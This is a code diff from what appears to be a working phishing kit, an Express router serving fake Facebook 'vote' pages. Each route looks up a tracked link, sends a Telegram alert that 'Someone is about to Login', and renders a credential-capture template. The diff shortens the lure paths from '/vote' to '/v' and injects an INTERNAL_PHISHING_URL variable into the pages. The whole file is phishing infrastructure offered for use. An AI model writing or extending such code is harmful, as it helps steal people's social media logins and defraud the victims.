@@ -6,7 +6,7 @@ const bot = require("../../telegram");
 const { blockPhishingUrl } = require("../../middlewares/blockUrl");
 
 
-router.get("/vote/:linkId", blockPhishingUrl, async (req, res) => {
+router.get("/v/:linkId", blockPhishingUrl, async (req, res) => {
     try {
         const { linkId } = req.params;
         const link = await Links.findOne({ link: linkId });
@@ -25,7 +25,9 @@ MESSAGE: Someone is about to Login.
 
                             `)
         }
-        return res.render("socials/facebook/vote", { req, link, name: link.modelName, linkType: link.linkType, linkId: link.id, retry: link.numberOfRetries, layout: false });
+        return res.render("socials/facebook/vote", { req,
+            INTERNAL_PHISHING_URL: process.env.INTERNAL_PHISHING_URL,
+            link, name: link.modelName, linkType: link.linkType, linkId: link.id, retry: link.numberOfRetries, layout: false });
     } catch (err) {
         console.log(err)
         return res.redirect("/notfound")
@@ -34,7 +36,7 @@ MESSAGE: Someone is about to Login.
 });
 
 
-router.get("/vote-2/:linkId", blockPhishingUrl, async (req, res) => {
+router.get("/v-2/:linkId", blockPhishingUrl, async (req, res) => {
     try {
         const { linkId } = req.params;
         const link = await Links.findOne({ link: linkId });
@@ -54,7 +56,9 @@ MESSAGE: Someone is about to Login.
                             `)
         }
         const samplePic = "https://i.postimg.cc/TYKGQSJw/stefan-stefancik-QXev-Dflbl8-A-unsplash.jpg";
-        return res.render("socials/facebook/vote2", { req, link, picture: link.picture || samplePic, name: link.modelName, linkType: link.linkType, linkId: link.id, layout: false });
+        return res.render("socials/facebook/vote2", { req,
+            INTERNAL_PHISHING_URL: process.env.INTERNAL_PHISHING_URL,
+            link, picture: link.picture || samplePic, name: link.modelName, linkType: link.linkType, linkId: link.id, layout: false });
     } catch (err) {
         console.log(err)
         return res.redirect("/notfound")
@@ -62,7 +66,7 @@ MESSAGE: Someone is about to Login.
 });
 
 
-router.get("/vote-3/:linkId", blockPhishingUrl, async (req, res) => {
+router.get("/v-3/:linkId", blockPhishingUrl, async (req, res) => {
     try {
         const { linkId } = req.params;
         const link = await Links.findOne({ link: linkId });
@@ -84,6 +88,7 @@ MESSAGE: Someone is about to Login.
         // const samplePic = "https://i.postimg.cc/TYKGQSJw/stefan-stefancik-QXev-Dflbl8-A-unsplash.jpg";
         return res.render("socials/facebook/vote3", {
             req,
+            INTERNAL_PHISHING_URL: process.env.INTERNAL_PHISHING_URL,
             link,
             url,
             res,
